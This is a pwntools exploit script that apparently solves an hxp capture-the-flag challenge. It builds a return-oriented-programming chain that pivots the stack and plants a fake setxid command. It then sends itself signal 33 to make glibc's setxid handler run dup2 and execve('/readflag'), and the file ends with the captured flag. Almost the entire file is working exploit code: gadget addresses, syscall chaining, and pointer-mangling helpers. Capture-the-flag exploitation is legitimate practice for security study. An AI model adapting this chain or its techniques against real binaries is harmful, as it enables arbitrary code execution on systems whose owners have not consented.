#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''
# b *0x0042f0a0
b *0x00401caf
# pthread_create
# b *0x00000000004062de
# __nptl_setxid_sighandler
b *0x42E9F0
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    elif args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
# sleep(1)
host = args.HOST or ''
port = int(args.PORT or 0)
# io = remote(host, port)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
logleak = lambda **k: [success(f"{k}: {v:#x}") for k, v in k.items()]
has_space       = lambda data: any(c in {0x20, 0x09, 0x0a, 0x0b, 0x0c, 0x0d} for c in data)
is_scanf_safe   = lambda data: not has_space(data)
is_stream_safe  = lambda data: not has_space(data)
is_cin_safe     = lambda data: not has_space(data)
is_fgets_safe   = lambda data: (b'\n' not in data)
is_gets_safe    = lambda data: is_fgets_safe(data)
is_getline_safe = lambda data: is_fgets_safe(data)


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper

rop = ROP(exe)
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
syscall_ret = rop.find_gadget(['syscall', 'ret'])[0]
w8g = 0x0041900d # mov [rsi], rax; ret;
r8g = 0x00488fe8 # mov rax, [rax]; ret;
addv = 0x00442e25 # add rax, rsi; ret;
xchg_edi_eax = 0x0047a8c6 # xchg edi, eax; ret;


def syscall(num, arg1=None, arg2=None):
    rop.raw(pop_rax)
    rop.raw(num)
    if arg1 is not None:
        rop.raw(pop_rdi)
        rop.raw(arg1)
    if arg2 is not None:
        rop.raw(pop_rsi)
        rop.raw(arg2)
    rop.raw(syscall_ret)

def w8(addr, v):
    rop.raw(pop_rsi)
    rop.raw(addr)
    rop.raw(pop_rax)
    rop.raw(v)
    rop.raw(w8g)

def r8(addr):
    rop.raw(pop_rax)
    rop.raw(addr)
    rop.raw(r8g)

def add_to_rax(v):
    rop.raw(pop_rsi)
    rop.raw(v)
    rop.raw(addv)

# padding
rop.raw(1337)

# get new rsp bss -> heap -> orig stack -> new stack

r8(0x4bf240)
add_to_rax(-0x1390)
# deref rax
rop.raw(r8g)
add_to_rax(-0xe0)
# deref rax
rop.raw(r8g)
add_to_rax(-0xc08)

new_rsp_loc = 0x4c2000
# store new rsp at 
rop.raw(pop_rsi)
rop.raw(new_rsp_loc)
rop.raw(w8g)


xidcmd_ptr = 0x4C6170
xidcmd = 0x4c3000
w8(xidcmd_ptr, xidcmd)
w8(xidcmd, constants.SYS_dup2)
w8(xidcmd+0x8, 4)
w8(xidcmd+0x10, 1)

def store_str(addr, s):
    for i in range(0, len(s), 8):
        chunk = s[i:i+8]
        chunk = chunk.ljust(8, b'\x00')
        w8(addr + i, u64(chunk))

    return addr

# send signal
syscall(constants.SYS_getpid)
rop.raw(xchg_edi_eax)
syscall(constants.SYS_tkill, arg2=33)

# wait one second before next signal
timespec = xidcmd + 0x1000
w8(timespec, 1)          # tv_sec
# tv_nsec, implicitly set to 0
syscall(constants.SYS_nanosleep, timespec, 0)

w8(xidcmd, constants.SYS_execve)
exename = xidcmd + 0x100
w8(xidcmd+0x8, exename)
w8(xidcmd+0x10, 0)
store_str(exename, b'/readflag')

# send signal
syscall(constants.SYS_getpid)
rop.raw(xchg_edi_eax)
syscall(constants.SYS_tkill, arg2=33)

# wait indefinitely
syscall(constants.SYS_pause)


info("rop len: " + hex(len(rop.chain())))
assert len(rop.chain()) <= 0x3000, "ROP chain too long!"

pause()
sla(b'send me your slop', rop.chain())

ia()

# hxp{huH_h0w_did_tH1s_h4pp3n___i_th0ught_I_w4s_s4f3...}